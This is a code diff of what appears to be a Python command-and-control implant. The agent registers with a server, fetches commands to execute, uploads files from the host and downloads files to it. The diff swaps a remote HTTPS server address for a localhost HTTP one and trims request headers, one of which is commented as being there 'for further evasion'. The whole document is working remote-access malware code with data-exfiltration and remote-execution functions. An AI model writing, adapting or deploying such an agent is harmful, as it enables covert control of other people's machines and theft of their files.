@@ -11,19 +11,11 @@ headers = {
     "Accept-Language": "en-US,en;q=0.9",
     "Accept-Encoding": "gzip, deflate, br",
     "Connection": "keep-alive",
-    "Upgrade-Insecure-Requests": "1",
-    "Sec-Fetch-Site": "none",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-User": "?1",
-    "Sec-Fetch-Dest": "document",
-    "Referer": "https://www.Rochak.com/",  # Optional: Use if there's a specific referrer you want to mimic
-    "DNT": "1",  # Do Not Track request header
-    "Cache-Control": "max-age=0",
-    # Custom headers for further evasion or required by the server
+    "Connection": "keep-alive",
+    "Referer": "https://www.facebook.com/"
 }
 
-
-SERVER_URL = 'https://100.64.218.67:5001'
+SERVER_URL = 'http://127.0.0.1:5001'
 AGENT_ID = str(uuid.uuid4())
 REGISTER_ENDPOINT = f'{SERVER_URL}/register'
 COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'
@@ -42,7 +34,7 @@ def resource_path(relative_path):
     
     return os.path.join(base_path, relative_path)
 
-SERVER_CERT = resource_path('server.crt')
+SERVER_CERT = None  # No SSL certificate needed for HTTP
 
 def execute_command(command):
     global current_working_directory
@@ -81,7 +73,6 @@ def upload_file_to_server(filename):
         with open(file_path, 'rb') as f:
             files = {'file': (filename, f)}
             response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
-            #response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
             if response.status_code == 200:
                 return "File Downloaded successfully."
             else:
@@ -93,7 +84,6 @@ def download_file_from_server(filename):
     # Adjust to the new server endpoint for fetching files
     download_url = f"{SERVER_URL}/fetch_file/{AGENT_ID}/{filename}"
     response = requests.get(download_url, headers=headers, verify=SERVER_CERT, allow_redirects=True)
-    #response = requests.get(download_url, verify=SERVER_CERT, allow_redirects=True)
     if response.status_code == 200:
         file_path = os.path.join(os.getcwd(), filename)  # Save in the current working directory
         with open(file_path, 'wb') as f:
@@ -105,7 +95,6 @@ def download_file_from_server(filename):
 def send_output(output):
     try:
         response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
-        #response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, verify=SERVER_CERT, allow_redirects=True)
         print("Response Status:", response.status_code)
         print("Response Text:", response.text)
         if response.ok:
@@ -114,7 +103,6 @@ def send_output(output):
             print("Failed to send output")
     except requests.exceptions.RequestException as e:
         print(f"Request Error: {e}")
-
 
 def register_agent():
     response = requests.post(REGISTER_ENDPOINT, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
